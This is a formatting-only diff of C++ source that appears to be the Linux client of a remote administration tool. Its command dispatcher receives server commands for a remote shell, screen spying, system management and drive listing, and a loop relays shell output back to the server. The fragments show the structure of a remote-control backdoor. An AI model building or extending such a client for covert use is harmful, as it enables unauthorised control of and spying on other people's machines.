@@ -67,7 +67,9 @@ public:
     {
         auto it = m_data.find(key);
         if (it != m_data.end()) {
-            try { return std::stoi(it->second); } catch (...) {}
+            try {
+                return std::stoi(it->second);
+            } catch (...) {}
         }
         return def;
     }
@@ -237,7 +239,7 @@ private:
     typedef Window      (*fn_XRootWindow)(Display*, int);
     typedef Atom        (*fn_XInternAtom)(Display*, const char*, int);
     typedef int         (*fn_XGetWindowProperty)(Display*, Window, Atom, long, long, int,
-                            Atom, Atom*, int*, unsigned long*, unsigned long*, unsigned char**);
+            Atom, Atom*, int*, unsigned long*, unsigned long*, unsigned char**);
     typedef int         (*fn_XFree)(void*);
     typedef int         (*fn_XSetErrorHandler)(int(*)(Display*, void*));
 
@@ -270,7 +272,10 @@ private:
     Atom    m_atomUtf8String;
     Atom    m_atomWmNameLegacy;
 
-    static int silentErrorHandler(Display*, void*) { return 0; }
+    static int silentErrorHandler(Display*, void*)
+    {
+        return 0;
+    }
 
     // 获取用户空闲时间（毫秒），libXss 不可用时返回 0
     unsigned long GetIdleTime()
@@ -503,8 +508,7 @@ private:
                     Mprintf("%s", buffer);
                     m_client->Send2Server(buffer, bytes_read);
                 }
-            }
-            else if (bytes_read == -1) {
+            } else if (bytes_read == -1) {
                 if (errno == EAGAIN || errno == EWOULDBLOCK) {
                     usleep(10000);
                 } else {
@@ -608,24 +612,19 @@ int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength)
     if (szBuffer[0] == COMMAND_BYE) {
         Mprintf("*** [%p] Received Bye-Bye command ***\n", user);
         g_bExit = S_CLIENT_EXIT;
-    }
-    else if (szBuffer[0] == COMMAND_SHELL) {
+    } else if (szBuffer[0] == COMMAND_SHELL) {
         std::thread(ShellworkingThread, nullptr).detach();
         Mprintf("** [%p] Received 'SHELL' command ***\n", user);
-    }
-    else if (szBuffer[0] == COMMAND_SCREEN_SPY) {
+    } else if (szBuffer[0] == COMMAND_SCREEN_SPY) {
         std::thread(ScreenworkingThread, nullptr).detach();
         Mprintf("** [%p] Received 'SCREEN_SPY' command ***\n", user);
-    }
-    else if (szBuffer[0] == COMMAND_SYSTEM) {
+    } else if (szBuffer[0] == COMMAND_SYSTEM) {
         std::thread(SystemManagerThread, nullptr).detach();
         Mprintf("** [%p] Received 'SYSTEM' command ***\n", user);
-    }
-    else if (szBuffer[0] == COMMAND_LIST_DRIVE) {
+    } else if (szBuffer[0] == COMMAND_LIST_DRIVE) {
         std::thread(FileManagerThread, nullptr).detach();
         Mprintf("** [%p] Received 'LIST_DRIVE' command ***\n", user);
-    }
-    else if (szBuffer[0] == CMD_HEARTBEAT_ACK) {
+    } else if (szBuffer[0] == CMD_HEARTBEAT_ACK) {
         if (ulLength >= 1 + sizeof(HeartbeatACK)) {
             HeartbeatACK* ack = (HeartbeatACK*)(szBuffer + 1);
             uint64_t now = GetUnixMs();
@@ -634,8 +633,7 @@ int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength)
             Mprintf("** [%p] Heartbeat ACK: RTT=%.1fms, SRTT=%.1fms ***\n",
                     user, rtt_ms, g_rttEstimator.srtt * 1000);
         }
-    }
-    else if (szBuffer[0] == CMD_MASTERSETTING) {
+    } else if (szBuffer[0] == CMD_MASTERSETTING) {
         int settingSize = ulLength - 1;
         if (settingSize >= (int)sizeof(int)) { // 至少包含 ReportInterval
             MasterSettings settings = {};
@@ -644,11 +642,9 @@ int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength)
                 g_heartbeatInterval = settings.ReportInterval;
             Mprintf("** [%p] MasterSettings: ReportInterval=%ds ***\n", user, g_heartbeatInterval);
         }
-    }
-    else if (szBuffer[0] == COMMAND_NEXT) {
+    } else if (szBuffer[0] == COMMAND_NEXT) {
         Mprintf("** [%p] Received 'NEXT' command ***\n", user);
-    }
-    else {
+    } else {
         Mprintf("** [%p] Received unimplemented command: %d ***\n", user, int(szBuffer[0]));
     }
     return TRUE;
